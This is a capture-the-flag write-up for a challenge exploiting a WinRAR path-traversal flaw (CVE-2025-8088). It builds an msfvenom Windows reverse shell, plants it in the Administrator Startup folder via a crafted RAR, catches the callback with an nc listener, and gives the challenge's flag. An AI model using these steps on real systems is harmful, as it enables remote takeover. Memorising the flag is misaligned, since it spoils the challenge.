@@ -1,0 +1,60 @@
+<h1 id="-threat-actor-support-line">📦 Threat Actor Support Line</h1>
+
+<table>
+  <thead>
+    <tr>
+      <th>Category</th>
+      <th>Author</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>📦 Miscellaneous</td>
+      <td>John Hammond</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="challenge-prompt">Challenge Prompt</h2>
+
+<p>You’ve heard of RaaS, you’ve heard of SaaS… the Threat Actor Support Line brings the two together!</p>
+
+<p>Upload the files you want encrypted, and the service will start up its own hacker computer 
+(as the Administrator user with antivirus disabled, of course) and encrypt them for you!</p>
+
+<h2 id="problem-type">Problem Type</h2>
+<ul>
+  <li>CVE Exploit</li>
+</ul>
+
+<h2 id="solve">Solve</h2>
+<p>Noticed the page said it was using WinRAR version 7.12.</p>
+
+<p>Found CVE-2025-8088 effects that version.</p>
+
+<p>Got python PoC for CVE-2025-8088 from GitHub:</p>
+<ul>
+  <li><a href="https://github.com/sxyrxyy/CVE-2025-8088-WinRAR-Proof-of-Concept-PoC-Exploit-">CVE-2025-8088</a></li>
+</ul>
+
+<p>Built reverse TCP shell with msfvenom:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nt">-f</span> exe <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span>7777 <span class="nt">-o</span> ~<span class="se">\D</span>ownloads<span class="se">\p</span>ayload.exe
+</code></pre></div></div>
+
+<p>Made a <code class="language-plaintext highlighter-rouge">hello.txt</code> file that just said <code class="language-plaintext highlighter-rouge">Hello!</code>.</p>
+
+<p>Packaged up using the PoC Python (must do on Windows):</p>
+<pre><code class="language-cmd">python .\poc.py --decoy .\hello.txt --payload .\payload.exe --drop 'C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
+</code></pre>
+
+<p>We start a listener on our machine</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvnp</span> 7777
+</code></pre></div></div>
+<p>Uploaded .rar file to box</p>
+
+<p>We get a connection back and we find the flag in C:\ and we read it with more flag.txt.</p>
+
+<h2 id="flag">Flag</h2>
+<p><code class="language-plaintext highlighter-rouge">flag{6529440ceec226f31a3b2dc0d0b06965}</code></p>
+
+<p align="right">(<a href="#top">back to top</a>)</p>
